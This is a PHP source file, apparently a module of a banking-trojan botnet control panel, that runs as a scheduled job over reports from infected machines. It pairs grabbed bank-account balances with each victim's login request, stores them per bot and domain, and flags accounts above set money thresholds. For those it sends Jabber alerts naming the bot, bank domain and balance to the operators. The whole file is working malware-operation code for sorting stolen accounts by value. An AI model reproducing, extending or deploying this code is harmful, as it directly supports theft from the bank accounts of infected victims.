<?php
require_once 'system/lib/global.php';
require_once 'system/lib/dbpdo.php';
require_once 'system/lib/datfile.php';
require_once 'system/lib/notify.php';

/** CronJobs concerning files/
 */
class cronjobs_balgrabber implements ICronJobs {
    /** BalanceGraber cronjob data file
     * @var string
     */
    const CRONJOB_DATA = 'system/data/balancegrabber-cron.dat';

    /** BalanceGraber settings file
     * @var string
     */
    const BL_SETS = 'system/data/balancegrabber-sets.dat';

    /** URL masks as a single OR'ed string, MySQL-ready
     * @var (string|null)[]
     */
    protected $_url_masks = null;

    /** Amount thresholds: array( currency => threshold )
     * @var int[]
     */
    protected $_amounts = array();

    /** Account-parser masks
     * @var array
     */
    protected $_accparser_masks = array();

    /** Config shortcut
     * @var array
     */
    protected $cfg;

    function __construct(){
        global $config;
        $this->cfg = $config['balgrabber'];

        $db = dbPDO::singleton();

        # Prepare the masks
        foreach ($config['balgrabber']['urls'] as $k => $masks)
            $this->_url_masks[$k] = wildcarts_or_body($masks);

        # Prepare the amounts
        $this->_amounts = $config['balgrabber']['amounts'];

        # Prepare accparser masks
        if (file_exists('system/reports_accparse.php')){
            $q = $db->query('SELECT `id`, `url` FROM `accparse_rules` WHERE `enabled`=1;');
            while ($row = $q->fetchObject())
                $this->_accparser_masks[ $row->id ] = wildcart($row->url);
        }
    }

    /** Check whether the domain+amount should be highlighted as per the 'highlight' config
     * @param string $domain
     * @param float $amount
     */
    protected function _mask_highlight($url, $currency, $amount){
        # Check URL
        if (!preg_match("~^{$this->_url_masks['highlight']}~iS", $url))
            return false;
        # Check balance
        if (!isset($this->_amounts['highlight'][$currency]))
            return false;
        if ($amount < $this->_amounts['highlight'][$currency])
            return false;
        return true;
    }

    /** Get accparse rule id that matches the report
     * @param string $url
     * @return int|null
     */
    protected function _accparse_rule($url){
        foreach ($this->_accparser_masks as $id => $mask)
            if (preg_match($mask, $url))
                return $id;
        return null;
    }

    /** Parse balance grabber reports
     * @cron period: 10m
     * @cron weight: -1
     */
    function cronjob_parse(){
        global $config;
        $db = dbPDO::singleton();

        if (isset($_GET['reset'])) {
            unlink(self::CRONJOB_DATA);
            $db->query('TRUNCATE TABLE `botnet_rep_balance`;');
        }

        # Cronjob data
        $cjob_datfile = new DatFileLoader(self::CRONJOB_DATA);
        $cjob_state = $cjob_datfile->load();
        if (is_null($cjob_state)){
            $last_report = array_slice(array_keys($db->report_tables()), -7, 1); # by default, start from today-3
            $cjob_state = (object)array('last_report' => array(current($last_report), 0));
        }

        # Walk through all unparsed reports
        $reports_found = 0;
        foreach ($db->report_tables() as $yymmdd => $table)
            if ($yymmdd >= $cjob_state->last_report[0]){ # ignore old tables
                # Select reports
                $q = $db->query(
                    "SELECT
                        `id`,
                        `type` AS `t`,
                        `time_system` AS `tm`,
                        `bot_id` AS `botId`,
                        `path_source` AS `url`,
                        `context`
                     FROM `{$table}`
                     WHERE
                        (`id` > :id OR `type` IN (:t_http, :t_https)) AND
                        `type` IN (:t_http, :t_https, :t_bgrab) AND
                        (:ignore IS NULL OR `path_source` NOT REGEXP :ignore)
                     ;", array(
                    ':id' => ($yymmdd == $cjob_state->last_report[0])? $cjob_state->last_report[1] : 0,
                    ':t_http' => BLT_HTTP_REQUEST,
                    ':t_https' => BLT_HTTPS_REQUEST,
                    ':t_bgrab' => BLT_GRABBED_BALANCE,
                    ':ignore' => $this->_url_masks['ignore'],
                ));

                # Incremental bot data storage: [botId][domain][currency] => data
                $botdata = array();

                # Last HTTP[S] bot report reference
                $bot_http_rep = array(); # [botId] => $report

                # Process them
                while ($report = $q->fetchObject()){
                    # Report id
                    $cjob_state->last_report = array($yymmdd, $report->id);

                    # Process
                    switch ($report->t){
                        case BLT_HTTP_REQUEST:
                        case BLT_HTTPS_REQUEST:
                            $bot_http_rep[$report->botId] = $report; # Just remember: it'll be bound with the corresponding balance report
                            break;
                        case BLT_GRABBED_BALANCE:
                            # Try to find the matching HTTP[S] report
                            $http = &$bot_http_rep[$report->botId];
                            if (!isset($http) || !$http || ($report->tm - $http->tm) > $this->cfg['time_window'])
                                break; // time window condition failed

                            # Get rid of the possible duplicate lines
                            $report->context = implode("\n", array_unique(array_map('trim', explode("\n", $report->context))));

                            # Parse it
                            // value=[436.18], code=[USD]
                            if (!preg_match_all('~^value=\[(.+)\], code=\[(.+)\]~mS', $report->context, $matches, PREG_SET_ORDER))
                                break; // parsing failed

                            # Process the balances separatedly
                            foreach ($matches as $m){
                                list(,$amount,$currency) = $m;

                                # Prepare the data
                                $data = array(
                                    ':botId' => $report->botId,
                                    ':domain' => $domain = parse_url($report->url, PHP_URL_HOST),
                                    ':dt' => $yymmdd,
                                    ':highlight' => null, // later
                                    ':balance' => $amount,
                                    ':currency' => $currency,
                                    ':rep_login' => "$yymmdd:{$http->id}",
                                    ':rep_bl' => "$yymmdd:{$report->id}",
                                    ':reps' => array(),
                                    ':accparse_rule' => $this->_accparse_rule($http->url),
                                );

                                # Insert or update?
                                $item = &$botdata[$report->botId][$domain][$currency];
                                if (!isset($item)){
                                    $item = $data;
                                } elseif (!$this->cfg['update_only_up'] || $data[':balance'] > $item[':balance']) {
                                    if ($item[':rep_bl'] != $data[':rep_bl']){
                                        $item[':reps'][] = $item[':rep_login'];
                                        $item[':reps'][] = $item[':rep_bl'];
                                    }
                                    $item[':balance'] = $data[':balance'];
                                    $item[':rep_login'] = $data[':rep_login'];
                                    $item[':rep_bl'] = $data[':rep_bl'];
                                    $item[':accparse_rule'] = $data[':accparse_rule']?: $item[':accparse_rule'];
                                }

                                $item['.http'] = $http;
                                $item['.report'] = $report;
                            }

                            # Reset the HTTP report: this way, only the 1st balance since sign on is grabbed
                            $http = null;
                            break;
                    }
                }

                # Process the gathered data
                $ins = $db->prepare(
                    'INSERT INTO `botnet_rep_balance`
                     SET
                        `botId`=:botId, `domain`=:domain, `dt`=:dt,
                        `highlight`=:highlight, `balance`=:balance, `currency`=:currency,
                        `rep_login`=:rep_login, `rep_bl`=:rep_bl, `reps`=:reps,
                        `accparse_rule` = :accparse_rule
                     ON DUPLICATE KEY UPDATE
                        `accparse_rule` = COALESCE(:accparse_rule, `accparse_rule`),
                     '.($this->cfg['update_only_up']
                     ?' `highlight` = GREATEST(`highlight`, :highlight),
                        `balance`   = GREATEST(`balance`, :balance),
                        `rep_login` = IF(`balance` > :balance, `rep_login`, :rep_login),
                        `rep_bl`    = IF(`balance` > :balance, `rep_bl`,    :rep_bl),
                        `reps`      = IF(`balance` > :balance, `reps`,      CONCAT_WS("\n", `reps`, :reps) )
                        '
                     :' `highlight` = :highlight,
                        `balance`   = :balance,
                        `rep_login` = :rep_login,
                        `rep_bl`    = :rep_bl,
                        `reps`      = CONCAT_WS("\n", `reps`, :reps)
                        '
                     ).';'
                );

                $notifications = array();
                foreach ($botdata as $botId => $l1)
                    foreach ($l1 as $domain => $l2)
                        foreach ($l2 as $currency => $data){
                            # Fix duplicate report references
                            $data[':reps'] = array_unique($data[':reps']); // might occur for multiple values in a single report

                            # Highlighting
                            $data[':highlight'] = $this->_mask_highlight($data['.report']->url, $currency, $data[':balance']);
                            if ($data[':highlight'])
                                if (jabber_notify_check_botid_allowed($botId))
                                    $notifications[] = "{$domain}: {$botId} = {$data[':balance']} {$currency}";

                            # Implore reports
                            $data[':reps'] = implode("\n", $data[':reps']);

                            # Remove extra
                            unset($data['.http']);
                            unset($data['.report']);

                            # Store
                            $ins->execute($data);
                            $reports_found++;
                        }

                # Send notifications
                if (!empty($notifications) && !empty($config['balgrabber']['notify_jids']))
                    jabber_notify($config['balgrabber']['notify_jids'], "Balance grabber highlights:\n\n".implode("\n", $notifications));

                # Update the state
                $cjob_datfile->save($cjob_state);
            }

        return array('balances grabbed' => $reports_found);
    }
}
